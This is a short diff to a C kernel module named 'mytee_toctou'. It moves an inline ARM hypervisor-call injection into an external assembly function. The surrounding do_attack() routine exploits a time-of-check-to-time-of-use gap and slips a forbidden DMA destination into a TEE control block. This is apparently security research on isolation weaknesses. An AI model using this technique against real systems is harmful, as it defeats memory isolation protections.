@@ -41,7 +41,11 @@
 
 #ifdef CONFIG_MYTEE
 #include <asm/mytee.h>
+#include <asm/virt.h>
 #endif
+
+/* External function defined in mytee.S for HVC call */
+extern void mytee_toctou_inject(u32 hypercall, u32 secure_buf_addr, u32 forbidden_dst, u32 dummy);
 
 #define DRIVER_NAME "mytee_toctou"
 #define PROC_NAME "mytee_toctou"
@@ -681,9 +685,6 @@ done:
  * verification and execution are NOT atomic.
  */
 
-/* HVC function to inject malicious destination into CB */
-extern void mytee_toctou_inject(u32 hypercall, u32 secure_buf_addr, u32 forbidden_dst, u32 dummy);
-
 static int do_attack(void)
 {
     u32 *payload;
@@ -819,16 +820,8 @@ static int do_attack(void)
         pr_info("[TOCTOU] HVC args: buf=0x%08x, forbidden_dst=0x%08x\n",
                 secure_buf_addr, forbidden_bus_dst);
         
-        /* Inline HVC call */
-        asm volatile(
-            "mov r0, %0\n"      /* r0 = MYTEE_TOCTOU_INJECT (150) */
-            "mov r1, %1\n"      /* r1 = secure buffer address */
-            "mov r2, %2\n"      /* r2 = forbidden destination (bus addr) */
-            "hvc #0\n"
-            :
-            : "r"(150), "r"(secure_buf_addr), "r"(forbidden_bus_dst)
-            : "r0", "r1", "r2", "memory"
-        );
+        /* Call mytee_toctou_inject defined in mytee.S */
+        mytee_toctou_inject(MYTEE_TOCTOU_INJECT, secure_buf_addr, forbidden_bus_dst, 0);
     }
     
     attack_state.attacker_inject_time = ktime_to_ns(ktime_sub(ktime_get(), t_inject));
